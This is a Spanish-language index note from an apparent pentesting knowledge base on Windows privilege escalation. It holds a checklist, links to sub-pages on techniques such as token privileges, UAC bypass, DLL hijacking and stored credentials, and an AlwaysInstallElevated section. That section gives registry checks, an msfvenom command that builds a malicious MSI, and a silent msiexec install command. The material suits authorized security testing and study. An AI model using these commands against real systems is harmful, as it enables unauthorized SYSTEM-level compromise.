---
tags: [privesc, windows]
platform: windows
---

# Privilege Escalation — Windows

> Escalar de usuario estándar a SYSTEM o Administrador elevado (High Integrity).

## Checklist

- [ ] Integridad actual: `whoami /groups | findstr /i "Mandatory Label"` → ver [[03-post-explotacion/privilege-escalation/windows/mic-y-uac|MIC y UAC]]
- [ ] Privilegios de token habilitados: `whoami /priv` → ver [[03-post-explotacion/privilege-escalation/windows/privilegios/privilegios-windows|Privilegios Windows]]
- [ ] Servicios con permisos débiles (binario o registro escribible) → [[03-post-explotacion/privilege-escalation/windows/servicios/servicios-windows|Servicios Windows]]
- [ ] AlwaysInstallElevated activo → ver abajo
- [ ] Credenciales almacenadas (Credential Manager, AutoLogon, SAM/SYSTEM) → [[03-post-explotacion/privilege-escalation/windows/credenciales/credenciales-windows|Credenciales Windows]]
- [ ] Tareas programadas con binario o ruta escribible → [[03-post-explotacion/privilege-escalation/windows/schtasks|Schtasks]]
- [ ] DLL Hijacking / Binary Hijacking / Unquoted Paths / Search Order → ver tabla
- [ ] Ya en Administrador local pero integridad Medium → [[03-post-explotacion/privilege-escalation/windows/uac-bypass|UAC Bypass]]
- [ ] Ya en High Integrity → Token Manipulation en [[03-post-explotacion/privilege-escalation/windows/privilegios/privilegios-windows|Privilegios Windows]]

## AlwaysInstallElevated

Si ambas claves están a 1, los instaladores MSI corren como SYSTEM.

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Si ambas = 1:

```
msfvenom -p windows/x64/exec CMD=payload.exe -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

## Navegación

| Técnica | Nota |
|---------|------|
| MIC y UAC (teoría) | [[03-post-explotacion/privilege-escalation/windows/mic-y-uac\|MIC y UAC]] |
| UAC Bypass | [[03-post-explotacion/privilege-escalation/windows/uac-bypass\|UAC Bypass]] |
| Servicios Débiles | [[03-post-explotacion/privilege-escalation/windows/servicios/servicios-windows\|Servicios Windows]] |
| Weak Windows Services | [[03-post-explotacion/privilege-escalation/windows/servicios/weak-windows-services\|Weak Windows Services]] |
| DLL Hijacking | [[03-post-explotacion/privilege-escalation/windows/dll-hijacking\|DLL Hijacking]] |
| Binary Hijacking | [[03-post-explotacion/privilege-escalation/windows/binary-hijacking\|Binary Hijacking]] |
| Unquoted Paths | [[03-post-explotacion/privilege-escalation/windows/path-hijacking/unquoted-paths\|Unquoted Paths]] |
| Search Order Hijacking | [[03-post-explotacion/privilege-escalation/windows/path-hijacking/search-order-hijacking\|Search Order Hijacking]] |
| PATH Environment Variable | [[03-post-explotacion/privilege-escalation/windows/path-hijacking/path-environment-variable\|PATH Environment Variable]] |
| Tareas Programadas | [[03-post-explotacion/privilege-escalation/windows/schtasks\|Schtasks]] |
| Privilegios de Token | [[03-post-explotacion/privilege-escalation/windows/privilegios/privilegios-windows\|Privilegios Windows]] |
| SeImpersonatePriv | [[03-post-explotacion/privilege-escalation/windows/privilegios/seimpersonatepriv\|SeImpersonatePriv]] |
| SeBackUpPriv | [[03-post-explotacion/privilege-escalation/windows/privilegios/sebackuppriv\|SeBackUpPriv]] |
| SeRestorePriv | [[03-post-explotacion/privilege-escalation/windows/privilegios/serestorepriv\|SeRestorePriv]] |
| SeManageVolumePriv | [[03-post-explotacion/privilege-escalation/windows/privilegios/semanagevolumepriv\|SeManageVolumePriv]] |
| Credenciales (índice) | [[03-post-explotacion/privilege-escalation/windows/credenciales/credenciales-windows\|Credenciales Windows]] |
| AutoLogon | [[03-post-explotacion/privilege-escalation/windows/credenciales/autologon\|AutoLogon]] |
| Credential Manager | [[03-post-explotacion/privilege-escalation/windows/credenciales/credmanager\|CredManager]] |
| SAM & SYSTEM | [[03-post-explotacion/privilege-escalation/windows/credenciales/sam--and--system\|SAM & SYSTEM]] |
| Local Service Privs | [[03-post-explotacion/privilege-escalation/windows/local-service-privs\|Local Service Privs]] |
| Living Off The Land | [[03-post-explotacion/privilege-escalation/windows/livingontheland\|LivingOnTheLand]] |
